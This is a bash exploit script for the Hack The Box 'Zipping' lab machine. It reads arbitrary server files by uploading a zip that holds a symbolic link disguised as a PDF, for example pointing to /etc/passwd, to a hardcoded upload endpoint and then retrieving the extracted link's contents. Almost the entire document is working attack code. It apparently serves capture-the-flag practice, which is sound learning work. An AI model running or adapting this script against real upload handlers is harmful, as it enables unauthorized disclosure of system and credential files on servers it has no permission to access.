#!/bin/bash

# Zipping HTB
# -----------
# Description: Reading files when unzipping a zip automatically (symbolic links)
# Author: Marss
# Date: 12 Set, 2023

# Ctrl + c
# (function)
signal_handler(){
    echo -e "\n[!] User Aborted."
    exit 1
}
# (signal)
trap signal_handler SIGINT

# Help panel
help_panel(){
    echo -e "\n | Zipping HTB (File reader) |"
    echo
    echo -e "[*] Usage: $0 -f <file_to_read>"
}

# File reader
file_reader(){
    temp_name=$(echo $RANDOM | md5sum | head -c 10)
    
    # Compress pdf with symbolic link
    create_files $temp_name
    # Upload compress zip and get output
    upload_file $temp_name
    # Remove files (force)
    rm -f $temp_name.{pdf,zip}
}

create_files(){
    filename=$1
    # 61c1170b93.pdf -> ../../../../../../etc/passwd
    ln -s "$file_to_read" $filename.pdf 
    zip --symlinks $filename.zip $filename.pdf 1>&2 >/dev/null
}

upload_file(){
    zip_file=$1.zip
    response=$(curl -s -F "zipFile=@$zip_file;type=application/zip" \
                       -F "submit=" \
                       http://10.10.11.229/upload.php)
    file_url=$(echo $response | grep -oP "href=[\"|'].*?[\"|']" | grep uploads | awk -F"=" '{print $2}' | tr -d '"')   
    content_file=$(curl -s http://10.10.11.229/$file_url)

    if [[ "$content_file" == *"Not Found"* ]]; then
        echo -e "\n[-] The file doesn't exist or we don't have permission to read it."
        rm -f $1.{pdf,zip}
        exit 1
    fi
    echo
    echo "$content_file"
}

# Main flow

# No Arguments
if [ "$#" -eq 0 ]; then
    help_panel
    exit 1
fi

while getopts ":hf:" opt
do
    case $opt in
        h)
            help_panel
            exit 0;;
        f)
            file_to_read=$OPTARG
            file_reader;;
        \?)
            echo -e "\n[x] Invalid option."
            exit 1;;
    esac
done